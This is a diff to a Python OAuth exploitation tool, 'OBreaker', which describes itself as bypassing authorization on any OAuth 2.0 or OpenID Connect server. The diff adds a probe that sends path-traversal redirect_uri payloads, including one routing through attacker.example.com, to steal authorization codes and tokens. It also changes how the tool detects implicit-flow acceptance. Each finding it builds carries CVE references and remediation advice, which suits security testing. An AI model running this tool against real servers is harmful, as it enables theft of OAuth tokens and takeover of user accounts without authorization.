@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-OBreaker v3.1 -- Generic OAuth Authorization Bypass Exploit Tool
+OBreaker v3.2 -- Generic OAuth Authorization Bypass Exploit Tool
 
 Full end-to-end Find, Forge, Fire (FFF) exploitation for 18 OAuth bypass techniques.
 Works against ANY OAuth 2.0 / OpenID Connect server, not just specific testbeds.
@@ -142,7 +142,7 @@ def make_session() -> requests.Session:
     retry = Retry(total=2, backoff_factor=0.3, status_forcelist=[502, 503])
     s.mount("https://", HTTPAdapter(max_retries=retry))
     s.mount("http://", HTTPAdapter(max_retries=retry))
-    s.headers["User-Agent"] = "OBreaker/3.1 (OAuth Security Scanner)"
+    s.headers["User-Agent"] = "OBreaker/3.2 (OAuth Security Scanner)"
     return s
 
 
@@ -510,6 +510,49 @@ class OAuthBreaker:
                 pass
 
         if not stolen_code:
+            # Path-traversal redirect_uri probe: test /../ variants on the registered URI
+            reg_redir = self.cfg.redirect_uri
+            if reg_redir:
+                traversal_payloads = [
+                    f"{reg_redir}/../anything",
+                    f"{reg_redir}/..%2ftest",
+                    f"{reg_redir}/%2e%2e/test",
+                    f"{reg_redir}/../post/next?path=https://attacker.example.com",
+                ]
+                for payload in traversal_payloads:
+                    try:
+                        params, _ = auth_params(self.cfg, redirect_uri=payload)
+                        r = self._get(url, params=params)
+                        if self._accepted(r) and not self._rejected_for(r, "redirect_uri"):
+                            chain.append(ExploitStep(
+                                phase="FIND",
+                                action=f"Sent redirect_uri with path traversal: {payload}",
+                                result=f"Server ACCEPTED traversal redirect_uri (status {r.status_code})",
+                                request=f"GET {url}?redirect_uri={payload}",
+                                response=f"{r.status_code} Location: {r.headers.get('Location', '')[:120]}",
+                            ))
+                            return Finding(
+                                technique="Response Mode Escape", severity="critical",
+                                title="redirect_uri path traversal bypass",
+                                description=(
+                                    f"Server accepts path-traversal in redirect_uri ({payload}). "
+                                    f"Combined with an open redirect on the client, attacker can "
+                                    f"steal OAuth tokens/codes by chaining /../ traversal to route "
+                                    f"the redirect through a secondary endpoint."
+                                ),
+                                chain=chain,
+                                proof=ExploitProof(
+                                    impact="PATH TRAVERSAL: redirect_uri prefix validated but /../ "
+                                           "traversal accepted, enabling token theft via open redirect chain."
+                                ),
+                                remediation=(
+                                    "Normalize the redirect_uri path before comparing against registered URIs. "
+                                    "Reject any URI containing path traversal sequences (/../, /%2e%2e/)."
+                                ),
+                                cves=["CVE-2024-37893", "CVE-2024-52289"],
+                            )
+                    except Exception:
+                        pass
             return None
 
         chain.append(ExploitStep(
@@ -1974,16 +2017,28 @@ class OAuthBreaker:
             return None
 
         body = r.text.lower()
-        implicit_accepted = (
-            self._accepted(r) or
-            (r.status_code in (400, 401) and "unsupported_response_type" not in body
-             and "response_type" not in body)
-        )
-        if r.status_code in (400,) and "unsupported_response_type" in body:
+        loc = r.headers.get("Location", "")
+
+        # Explicit rejection: server says unsupported_response_type
+        if "unsupported_response_type" in body or "unsupported_response_type" in loc:
             return None
 
+        # 302 to interaction/login page without error= means implicit IS accepted
+        # (rejection would be 400 or 302 with error=unsupported_response_type)
+        loc_has_error = "error=" in loc
+        loc_error_is_response_type = "unsupported_response_type" in loc
+        implicit_accepted = (
+            self._accepted(r) and not loc_error_is_response_type
+        ) or (
+            r.status_code in (400, 401) and "unsupported_response_type" not in body
+            and "response_type" not in body and "invalid_client" not in body
+        )
+        # 302 with error= that isn't about response_type (e.g. login_required) still
+        # means implicit flow is supported, just needs auth
+        if r.status_code in (302, 303) and loc_has_error and not loc_error_is_response_type:
+            implicit_accepted = True
+
         # Extract token from redirect fragment if we got one directly
-        loc = r.headers.get("Location", "")
         frag_token = ""
         if "access_token=" in loc:
             parsed = urllib.parse.urlparse(loc)
@@ -2238,7 +2293,7 @@ class OAuthBreaker:
     def run_all(self) -> list[Finding]:
         mode = "profile" if self.profile else "generic"
         print(f"\n{C.CYAN}{C.BOLD}  +=============================================+{C.RESET}")
-        print(f"{C.CYAN}{C.BOLD}  |  OBreaker v3.1 -- OAuth Exploit Tool        |{C.RESET}")
+        print(f"{C.CYAN}{C.BOLD}  |  OBreaker v3.2 -- OAuth Exploit Tool        |{C.RESET}")
         print(f"{C.CYAN}{C.BOLD}  |  Find - Forge - Fire (Full Exploitation)    |{C.RESET}")
         print(f"{C.CYAN}{C.BOLD}  +=============================================+{C.RESET}")
         print(f"\n  {C.DIM}Target:  {self.cfg.base_url}{C.RESET}")
@@ -2391,7 +2446,7 @@ def save_json_report(findings: list[Finding], path: str):
 
 def main():
     parser = argparse.ArgumentParser(
-        description="OBreaker v3.1 -- Generic OAuth Authorization Bypass Exploit Tool",
+        description="OBreaker v3.2 -- Generic OAuth Authorization Bypass Exploit Tool",
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog="""
 Examples:
